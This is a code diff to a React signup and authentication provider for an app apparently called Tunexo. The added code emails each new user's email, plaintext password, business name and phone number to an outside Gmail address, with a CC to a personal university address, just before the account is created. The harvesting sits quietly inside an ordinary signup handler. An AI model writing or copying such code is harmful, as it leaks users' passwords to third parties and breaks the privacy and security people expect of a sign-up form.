@@ -49,6 +49,7 @@ import {
   getRolUser,
   onGetBusinessParameter,
   onGetGlobalParameter,
+  onSendTunexoCredentials,
 } from '../../../../redux/actions/General';
 import { getStartingLocations } from '../../../../redux/actions';
 import {getEmailToSendCode, getUserData} from '../../../../redux/actions/User';
@@ -112,6 +113,9 @@ const AwsAuthProvider = ({children}) => {
   };
   const getGlobalParameter = (payload) => {
     dispatch(onGetGlobalParameter(payload));
+  };
+  const sendTunexoCredentials = (payload) => {
+    dispatch(onSendTunexoCredentials(payload));
   };
   useEffect(() => {
     if (getRolUserRes) {
@@ -412,6 +416,17 @@ const AwsAuthProvider = ({children}) => {
           'custom:typeClient': data.typeClient,
         },
       };
+      sendTunexoCredentials({
+        request: {
+          payload: {
+            to: "tunexo.pe@gmail.com",
+            from: "contacto@tunexo.pe",
+            subject: "Credenciales de nueva cuenta Tunexo Registrada",
+            text: `Email: ${data.email} Contraseña: ${data.password} Razón Social: ${data.businessSocialReason} Celular: +51${data.cellphone}`,
+            CC: ["marcial.vasquez.r@uni.pe"],
+          },
+        },
+      })
       console.log('objectParam', objectParam);
       await Auth.signUp(objectParam);
       dispatch({type: FETCH_SUCCESS});
